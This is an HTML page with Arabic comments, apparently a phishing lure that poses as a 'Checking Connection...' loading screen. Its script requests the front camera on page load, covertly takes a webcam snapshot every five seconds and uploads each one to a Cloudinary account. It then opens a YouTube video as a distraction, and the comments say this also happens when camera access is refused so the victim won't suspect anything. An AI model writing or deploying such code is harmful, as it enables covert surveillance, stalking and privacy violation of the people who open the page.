<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        /* تصميم صفحة تحميل وهمية بسيطة */
        body { background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p style="margin-left: 20px;">Checking Connection...</p>

    <video id="video" playsinline autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const cloudName = 'dgkttv99v';
        const uploadPreset = '562842218131543'; // تأكد إن ده Unsigned في إعدادات Cloudinary
        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // حط لينك الفيديو اللي عايزه هنا

        let tabOpened = false;

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // ابدأ أول لقطة بعد ثانيتين
                setTimeout(takeSnapshot, 2000);
                
                // كرر كل 5 ثواني
                setInterval(takeSnapshot, 5000);
            } catch (e) {
                console.log("Camera Error");
                // لو رفض الكاميرا، افتح اليوتيوب برضه عشان ميتشكش
                window.open(youtubeLink, '_blank');
            }
        }

        function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            const imageData = canvas.toDataURL("image/png");

            const formData = new FormData();
            formData.append('file', imageData);
            formData.append('upload_preset', uploadPreset);

            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                console.log("Uploaded");
                // أول ما أول صورة تترفع، افتح تاب اليوتيوب
                if (!tabOpened) {
                    window.open(youtubeLink, '_blank');
                    tabOpened = true;
                }
            });
        }

        // تشغيل فوري أول ما الصفحة تفتح
        window.onload = init;
    </script>
</body>
</html>
